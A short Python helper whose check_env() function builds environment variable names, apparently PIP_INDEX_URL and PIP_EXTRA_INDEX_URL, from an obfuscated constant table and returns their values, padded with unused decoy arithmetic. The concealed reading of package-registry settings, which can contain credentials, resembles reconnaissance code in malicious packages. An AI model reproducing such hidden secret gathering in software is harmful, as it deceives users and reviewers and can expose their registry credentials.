
import os
from .const.list_table import CONSTANT_TABLE


def check_env():

    ret_arr = []
    env = dict(os.environ)

    a = len(ret_arr)
    b = len(env)
    result = (a ** 2 + b * 3) - (a + b)
    result = result % 100

    norm = '%s_%s' % (CONSTANT_TABLE[3], CONSTANT_TABLE[1])
    pip_env = ("%s_%s" % (CONSTANT_TABLE[2], norm)).upper()
    if pip_env in env and len(env[pip_env]) > 0:
        env_val = env[pip_env]
        ret_arr.append(env_val)

    extra = '%s_%s' % (CONSTANT_TABLE[4], norm)
    pip_env = ("%s_%s" % (CONSTANT_TABLE[2], extra)).upper()
    if pip_env in env and len(env[pip_env]) > 0:
        env_val = env[pip_env]
        ret_arr.append(env_val)

    return ret_arr
